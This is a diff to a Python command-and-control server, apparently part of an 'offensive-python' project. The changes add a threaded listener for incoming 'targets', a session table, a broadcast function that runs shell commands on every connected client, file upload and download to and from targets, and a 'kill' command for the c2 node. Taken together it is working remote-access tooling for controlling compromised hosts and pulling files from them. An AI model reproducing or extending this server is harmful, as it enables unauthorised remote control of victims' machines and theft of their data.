@@ -6,23 +6,26 @@ import platform
 import pathlib
 import hashlib
 import datetime
+from time import asctime
 import termcolor
+import threading
+import logging
+from prettytable import PrettyTable
+from urllib3 import add_stderr_logger
 
 # TODO:
-#   1. Broadcast utility overhaul
-#   2. Log file utility overhaul
-#   3. Threads and locks implementation
-#   4. Add 'offensive-python' project utilities:
+#   2. locks implementation
+#   3. Add 'offensive-python' project utilities:
 #       a. Display alert when client is visiting a blacklisted website
 #       b. Send heartbeat from client to server to verify it is alive
 #       c. Display alert when duplicate mac address is found in the client's ARP table
 #       d. Log all alerts as events (Should include: When, where & what happened)
-#   5. Encryption implementation
-#   6. Send platform data from client to sever upon request
-#   7. Go over function docstrings
-#   8. Read global variable values from json file upon flag usage
+#   4. Encryption implementation
+#   5. Send platform data from client to sever upon request
+#   6. Read global variable values from json file upon flag usage
+#   7. Fix upload / download for broadcast function
 
-SERVER_IP = "0.0.0.0"  # Remote address
+SERVER_IP = "0.0.0.0"
 PORT = 1234  # Remote port
 FORMAT = "utf-8"  # Message encoding format
 HEADER_SIZE = 10  # Message header size
@@ -75,6 +78,8 @@ def download_file(sock: socket.socket, path: str) -> None:
     :type path: str
     :return: None
     """
+    raddr = sock.getpeername()
+    logging.info(f"{raddr} - Downloading file from target.")
     # Implemented segmentation when writing / receiving file data to avoid memory overload
     file_name = pathlib.Path(path).name  # File name without the full path
     dst = str(DOWNLOADS.joinpath(file_name))  # Create destination file full path
@@ -100,6 +105,7 @@ def download_file(sock: socket.socket, path: str) -> None:
         else:  # Error finding / reading file on client side
             result = "FAILURE: FileNotFoundError / IOError"
             print(clr("[!] ERROR: File doesn't exist / Access denied"))
+            logging.error(f"{raddr} - Target file unreachable (IOError / FNFError on remote).")
     except socket.timeout:  # Reached timeout, proceed to check file integrity
         # Calculate downloaded file hash
         result_md5 = get_file_hash(data)
@@ -107,15 +113,13 @@ def download_file(sock: socket.socket, path: str) -> None:
         if result_md5 == original_md5:
             result = f"SUCCESS: {dst}"
             print(f"{clr('[+] Download successful -')} {dst}")
+            logging.info(f"{raddr} - Successfully downloaded target file - {dst}")
         else:
             result = "FAILURE: Session timeout"
             print(clr("[!] ERROR: Timeout reached while downloading the file"))
+            logging.error(f"{raddr} - Encountered error while downloading file.")
     finally:
         sock.settimeout(original)  # Reset timeout value
-        # Log attempt + result
-        with open(LOG_PATH, "a") as log:
-            prefix = datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')
-            log.write(f"{prefix}\tDownload attempt for {path}, {result}\n")
 
 
 def upload_file(sock: socket.socket, path: str) -> None:
@@ -128,6 +132,8 @@ def upload_file(sock: socket.socket, path: str) -> None:
     :type path: str
     :return: None
     """
+    raddr = sock.getpeername()
+    logging.info(f"{raddr} - Uploading file to target.")
     # Implemented segmentation when reading / sending file data to avoid memory overload
     path = str(pathlib.Path(path).resolve())  # Absolute path (Resolve symlinks)
     log_result = ""
@@ -149,7 +155,8 @@ def upload_file(sock: socket.socket, path: str) -> None:
         for segment in data:
             if segment:
                 sock.send(segment)
-    except (FileNotFoundError, IOError):  # Signal: Error when trying tor ead from target file
+    except (FileNotFoundError, IOError):  # Signal: Error when trying to read from target file
+        logging.exception(f"Target file unreachable (IOError / FNFError on local host).")
         sock.send("0".ljust(HEADER_SIZE).encode(FORMAT))
     finally:
         # final result and message from the client side
@@ -157,20 +164,16 @@ def upload_file(sock: socket.socket, path: str) -> None:
         message = sock.recv(SEGMENT_SIZE).decode(FORMAT).strip()
         if result:  # Successful upload
             dst = str(DOWNLOADS.joinpath(message))
+            logging.info(f"{raddr} - Successfully uploaded target file - {dst}")
             print(f"{clr('[+] Upload successful -')} {dst}")
-            log_result = f"SUCCESS: {dst}"
         else:  # Upload failed
             # Print relevant error to match the final message received from the client side
             if message == "TIMEOUT":
+                logging.error(f"{raddr} - Encountered error while uploading file.")
                 print(clr("[!] ERROR: Timeout reached while uploading the file"))
-                log_result = "FAILURE: Session timeout"
             elif message == "ERROR":
+                logging.error(f"{raddr} - Target file unreachable (IOError / FNFError on remote).")
                 print(clr("[!] ERROR: File doesn't exist / Access denied"))
-                log_result = "FAILURE: FileNotFoundError / IOError"
-        # Log attempt + result
-        with open(LOG_PATH, "a") as log:
-            prefix = datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')
-            log.write(f"{prefix}\tUpload attempt for {path}, {log_result}\n")
 
 
 def recv_msg(sock: socket.socket, command: str) -> None:
@@ -185,40 +188,33 @@ def recv_msg(sock: socket.socket, command: str) -> None:
     :rtype: str
     """
     try:
+        raddr = sock.getpeername()
         # Only receive the header and extract the message length
+        # Can trigger a ValueError if the target disconnects and sends an empty header
         msg_len = int(sock.recv(HEADER_SIZE).decode(FORMAT))
         # Receive the message in its entirety
         output = sock.recv(msg_len).decode(FORMAT)
         # Unrecognized command
         if "is not recognized as an internal or external command" in output or "not found" in output:
             print(clr("[!] ERROR: Command not found"))
-            print(clr('[*] HINT: The Target\'s OS is - ') + platform.system())
+            logging.error(f"{raddr} - Command not recognized - {command}")
         elif "timed out after" in output:  # Command execution timeout on target
             print(clr("[!] ERROR: Command timed out"))
+            logging.error(f"{raddr} - Unable to execute command on target - {command}")
         elif command[:3] == "cd " and output == "":  # Changed directory successfully on client side
             pass
-        else:  # Successful command execution resulting in output
-            # Log command + output
-            with open(LOG_PATH, "a") as log:
-                # Log the command executed
-                prefix = datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')
-                log.write(f"{prefix}\t{command}\n")
-
-                # Log the output (indented)
-                for line in output.splitlines():
-                    log.write(f"{line}\n")
-
-            # Print output on server side
-            if output:
-                print(output.strip())
+        elif output:  # Successful command execution resulting in output
+            logging.info(f"{raddr} - Received output:\n{output}")
+            print(output.strip())
     except ValueError:  # Received empty header (Client disconnected before sending a reply)
-        pass
+        logging.exception(f"{raddr} - Target disconnected mid command execution.")
+        logging.info(f"{raddr} - Removing target from database.")
+        CLIENTS.remove(client for client in CLIENTS if client[0] == sock)  # Remove current client from clients list
 
 
 def send_msg(sock: socket.socket, command: str) -> None:
     """
     Sends a command to the client and prints its output.
-    It can also broadcast the bash command to all targets if needed by triggering the 'broadcast' function.
 
     :param sock: Client socket object
     :type sock: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -226,11 +222,6 @@ def send_msg(sock: socket.socket, command: str) -> None:
     :type command: str
     :return: None
     """
-    # FIXME
-    #     enable_broadcast = input(color_msg("[?] Would you like to broadcast your command? y/n ")).lower()
-    #     if enable_broadcast == "y":
-    #         broadcast(f"{msg_len:<{HEADER_SIZE}}" + msg)
-    pass  # Place holder until broadcast utility is fixed
     # Send the message to the client, prefixed by a header of a set size
     # The header contains the message length padded by spaces (Used to ensure connection reliability)
     # Design flaw: Message size limit (E.g Message size limit of '9,999,999,999' if 'HEADER_SIZE' equals '10')
@@ -238,25 +229,38 @@ def send_msg(sock: socket.socket, command: str) -> None:
     sock.send((f"{msg_len:<{HEADER_SIZE}}" + command).encode(FORMAT))
 
     # Receive command output from the client side, if relevant
-    if command not in ["quit", "exit", "clear"] and command[:9] != "download " and command[:7] != "upload ":
+    server_side_keywords = ["quit", "exit", "clear", "bg", "background", "kill"]
+    if command not in server_side_keywords and command[:9] != "download " and command[:7] != "upload ":
         recv_msg(sock, command)
 
 
-# FIXME
-#     def broadcast(msg):
-#         """This function broadcasts a message to all available clients.
-#         :param msg: Message in clear text
-#         :type msg: str
-#         :return: None
-#         """
-#         for client in CLIENTS:
-#             try:
-#                 client[0].send(msg.encode(FORMAT))
-#                 print(color_msg("[!] Communicating with ") + str(client[1]))
-#                 print(color_msg(recv_msg(client[0])))
-#             except:
-#                 print(color_msg("[!] Failed to send the message to - ") + str(client[1]))
-#         print(color_msg("[*] Message sent to all available clients"))
+def broadcast(command: str) -> None:
+    """
+    This function broadcasts a command to all connected clients.
+
+    :param command: Command to run on all clients
+    :type command: str
+    :return: None
+    """
+    logging.info(f"Broadcasting command to all available targets - {command}")
+    for client in CLIENTS:
+        try:
+            # FIXME
+            # if command[:9] == "download ":  # Download file from all clients
+            #     download_file(client[0], command[9:])
+            # elif command[:7] == "upload ":  # Upload file to all clients
+            #     upload_file(client[0], command[7:])
+            # else:
+            print(termcolor.colored(f"[{client[1][0]}:{client[1][1]}]", "yellow"))
+            send_msg(client[0], command)
+        except Exception as err:
+            print(f"{clr(f'[!] ERROR SENDING MESSAGE: {err}')} ({str(client[1])})")
+            logging.exception(f"{client[1]} - Unable to communicate with target.")
+            logging.info(f"{client[1]} - Removing target from database.")
+            CLIENTS.remove(client)
+
+    print(clr("[+] Finished executing on all available targets"))
+    logging.info("Finished executing on all available targets.")
 
 
 def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
@@ -270,12 +274,21 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
     :return: None
     """
     try:
+        maintain_session = True  # Determines whether to maintain a session upon exiting the shell
         while sock:
             command = input(clr(f"TARGET@{addr}> "))  # Command to run on client side
             if command:
+                logging.info(f"{addr} - Sending command to target - {command}")
                 send_msg(sock, command)
                 # For certain keywords, run the appropriate action
-                if command in ["quit", "exit"]:  # Quit current client CLI
+                if command in ["quit", "exit", "kill"]:  # Quit current client CLI
+                    maintain_session = False
+                    logging.info(f"{addr} - Closing session on target.")
+                    if command == "kill":
+                        logging.critical(f"{addr} - Terminating c2 node.")
+                    break
+                elif command in ["bg", "background"]:
+                    logging.info(f"{addr} - Moving session to background.")
                     break
                 elif command[:3] == "cd ":  # Change directory on the client side
                     pass
@@ -283,16 +296,70 @@ def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
                     os.system('cls' if os.name == 'nt' else 'clear')
                 elif command[:9] == "download ":  # Download specified file from client side to server side
                     download_file(sock, command[9:])
-                elif command[:7] == "upload ":  # Download specified file from server side to client side
+                elif command[:7] == "upload ":  # Upload specified file from server side to client side
                     upload_file(sock, command[7:])
     except ConnectionError as err:  # Socket connection error
         print(f"{clr('[!] ERROR: Current socket is no longer valid -')} {err}")
-    finally:  # Always close sockets when done
-        if sock:
+        logging.exception(f"{addr} - Unable to communicate with target.")
+        logging.info(f"{addr} - Removing target from database.")
+        CLIENTS.remove((sock, addr))
+    finally:
+        # Close & remove sock from clients list if user exists with 'exit' / 'quit'
+        # Do nothing if user exists with 'background' / 'bg'
+        if sock and not maintain_session:
             sock.close()
+            logging.info(f"{addr} - Removing target from database.")
+            CLIENTS.remove((sock, addr))
 
 
-def establish_connection(s: socket.socket) -> None:
+def display_sessions() -> None:
+    """
+    Prints a table of all connected clients.
+
+    :return: None
+    """
+    # Create table and column names
+    clients_info_table = PrettyTable()
+    id = termcolor.colored("ID", "yellow")
+    address = termcolor.colored("ADDRESS", "yellow")
+    clients_info_table.field_names = [id, address]
+
+    # Add connected clients to table
+    for i, session in enumerate(CLIENTS):
+        addr = CLIENTS[i][1][0]
+        port = CLIENTS[i][1][1]
+        data = f"{addr}:{port}"
+        clients_info_table.add_row([i, data])
+
+    print(clients_info_table)
+
+
+def accept_new_connections(s: socket.socket) -> None:
+    """
+    Constantly accepts new connections if possible, and saves information about new connections.
+
+    :param s: Server side bound socket object
+    :type s: socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    :return: None
+    """
+    s.settimeout(TIMEOUT)
+    logging.info("Listening for incoming connections.")
+    while True:
+        try:
+            sock, addr = s.accept()
+            # Save new connection information
+            if (sock, addr) not in CLIENTS:
+                CLIENTS.append((sock, addr))
+                logging.info(f"{addr} - New connection established.")
+            print(clr("[+] Connected to ") + str(addr))
+        except socket.timeout:
+            pass
+        except OSError:  # Main thread was discontinued - User exited the program
+            logging.info("Seems like the c&c server was shut down, closing listener.")
+            break
+
+
+def handle_connections(s: socket.socket) -> None:
     """
     Listens for clients and accepts incoming connections.
 
@@ -303,21 +370,36 @@ def establish_connection(s: socket.socket) -> None:
     s.listen(5)
     sock = ""
     try:
-        while True:
-            print(f"\n{clr('[*] Listening for incoming connections...')}")
-            sock, addr = s.accept()
-            # FIXME
-            #     Broadcast related
-            #     if (sock, addr) not in CLIENTS:
-            #         CLIENTS.append((sock, addr))
-            print(clr("[+] Connected to ") + str(addr))
-            # Start a command line interface for the current client
-            shell(sock, addr)
+        print(f"\n{clr('[*] Server is running on -')} {SERVER_IP}")
+        print(f"{clr('[*] Listening for incoming connections...')}")
+        # Accept connections in a seperate thread to avoid blocking the terminal
+        thread = threading.Thread(target=accept_new_connections, args=(s,))
+        thread.start()
 
-            # Wait for instructions after terminating the current connection
-            instruction = input(clr("[*] Would you like to stop listening for incoming connections? y/n "), ).lower()
-            if instruction == "y":  # Terminate server side
+        # User terminal for session handling
+        while True:
+            command = input(clr("> "))
+            if command == "clear":  # Clear server side console screen
+                os.system('cls' if os.name == 'nt' else 'clear')
+            elif command in ["exit", "quit"]:  # Close server side script
                 break
+            elif command == "sessions":  # List available sessions
+                display_sessions()
+            elif command[:12] == "sessions -i ":  # Start a shell based on the specified session id
+                # Verify specified session id exists
+                i = command[12:]
+                if i.isdigit():
+                    if 0 <= int(i) < len(CLIENTS):
+                        # Start a command line interface for the specified client
+                        logging.info(f"{CLIENTS[int(i)][1]} - Starting new shell on target.")
+                        shell(CLIENTS[int(i)][0], CLIENTS[int(i)][1])
+                    else:
+                        print(f"{clr('[!] ERROR: The specified index is out of range')}")
+                else:
+                    print(f"{clr('[!] ERROR: The specified index is not an integer')}")
+            elif command[:10] == "broadcast ":  # Broadcast a command to all clients
+                broadcast(command[10:])
+                continue  # Skip to next iteration
     except KeyboardInterrupt:
         pass
     finally:
@@ -331,18 +413,22 @@ def main() -> None:
 
     :return: None
     """
+    logging.basicConfig(level=logging.INFO, filename="c2.log", filemode="a",
+                        format=f"%(asctime)s %(levelname)s - %(message)s", datefmt="%d-%m-%Y %H:%M:%S")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # Enable address reuse
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     # Establish server side
     s.bind((SERVER_IP, PORT))
+    logging.info(f"({SERVER_IP}, {PORT}) - Starting c&c server.")
     try:
-        establish_connection(s)
+        handle_connections(s)
     except KeyboardInterrupt:
         pass
     finally:
         if s:
             s.close()
+        logging.info(f"({SERVER_IP}, {PORT}) - Stopping c&c server.")
         print("""\n
              ██████   ██████   ██████  ██████  ██████  ██    ██ ███████
             ██       ██    ██ ██    ██ ██   ██ ██   ██  ██  ██  ██
